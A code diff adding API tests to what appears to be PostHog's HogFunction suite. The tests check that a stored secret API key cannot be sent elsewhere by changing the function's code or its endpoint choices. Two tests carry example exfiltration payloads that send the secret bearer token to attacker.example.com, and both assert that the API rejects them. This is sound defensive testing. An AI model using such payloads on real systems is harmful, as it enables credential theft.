@@ -774,6 +774,95 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         ]
         assert filtered_actual_activities == expected_activities
 
+    def _create_destination_with_secret(self) -> str:
+        payload = {
+            "type": "destination",
+            "name": "Secret destination",
+            "hog": "fetch(f'{inputs.endpoint}/track', {'headers': {'Authorization': f'Bearer {inputs.apiKey}'}})",
+            "inputs_schema": [
+                {
+                    "key": "endpoint",
+                    "type": "choice",
+                    "label": "Endpoint",
+                    "choices": [{"label": "US", "value": "https://api.us.example.com"}],
+                    "required": True,
+                },
+                {"key": "apiKey", "type": "string", "label": "API Key", "secret": True, "required": True},
+            ],
+            "inputs": {
+                "endpoint": {"value": "https://api.us.example.com"},
+                "apiKey": {"value": "I AM SECRET"},
+            },
+        }
+        res = self.client.post(f"/api/projects/{self.team.id}/hog_functions/", data=payload)
+        assert res.status_code == status.HTTP_201_CREATED, res.json()
+        return res.json()["id"]
+
+    def test_cannot_redirect_preserved_secret_via_hog_change(self, *args):
+        function_id = self._create_destination_with_secret()
+        res = self.client.patch(
+            f"/api/projects/{self.team.id}/hog_functions/{function_id}",
+            data={
+                "hog": "fetch('https://attacker.example.com', {'headers': {'Authorization': f'Bearer {inputs.apiKey}'}})",
+                "inputs": {"apiKey": {"secret": True}},
+            },
+        )
+        assert res.status_code == status.HTTP_400_BAD_REQUEST, res.json()
+        assert "Re-enter the secret" in str(res.json())
+        # The stored secret and code are untouched
+        obj = HogFunction.objects.get(id=function_id)
+        assert obj.encrypted_inputs["apiKey"]["value"] == "I AM SECRET"
+        assert "attacker.example.com" not in obj.hog
+
+    def test_cannot_redirect_preserved_secret_via_schema_change(self, *args):
+        function_id = self._create_destination_with_secret()
+        # Add an attacker-controlled host to the choice allow-list and point the endpoint at it,
+        # while keeping the stored secret with {"secret": true}.
+        res = self.client.patch(
+            f"/api/projects/{self.team.id}/hog_functions/{function_id}",
+            data={
+                "inputs_schema": [
+                    {
+                        "key": "endpoint",
+                        "type": "choice",
+                        "label": "Endpoint",
+                        "choices": [
+                            {"label": "US", "value": "https://api.us.example.com"},
+                            {"label": "x", "value": "https://attacker.example.com"},
+                        ],
+                        "required": True,
+                    },
+                    {"key": "apiKey", "type": "string", "label": "API Key", "secret": True, "required": True},
+                ],
+                "inputs": {
+                    "endpoint": {"value": "https://attacker.example.com"},
+                    "apiKey": {"secret": True},
+                },
+            },
+        )
+        assert res.status_code == status.HTTP_400_BAD_REQUEST, res.json()
+        assert "Re-enter the secret" in str(res.json())
+        obj = HogFunction.objects.get(id=function_id)
+        assert obj.encrypted_inputs["apiKey"]["value"] == "I AM SECRET"
+        assert obj.inputs["endpoint"]["value"] == "https://api.us.example.com"
+
+    def test_can_change_hog_when_resupplying_secret(self, *args):
+        function_id = self._create_destination_with_secret()
+        res = self.client.patch(
+            f"/api/projects/{self.team.id}/hog_functions/{function_id}",
+            data={
+                "hog": "fetch(f'{inputs.endpoint}/v2/track', {'headers': {'Authorization': f'Bearer {inputs.apiKey}'}})",
+                "inputs": {
+                    "endpoint": {"value": "https://api.us.example.com"},
+                    "apiKey": {"value": "FRESHLY_ENTERED"},
+                },
+            },
+        )
+        assert res.status_code == status.HTTP_200_OK, res.json()
+        obj = HogFunction.objects.get(id=function_id)
+        assert "v2/track" in obj.hog
+        assert obj.encrypted_inputs["apiKey"]["value"] == "FRESHLY_ENTERED"
+
     def test_generates_hog_bytecode(self, *args):
         response = self.client.post(
             f"/api/projects/{self.team.id}/hog_functions/",
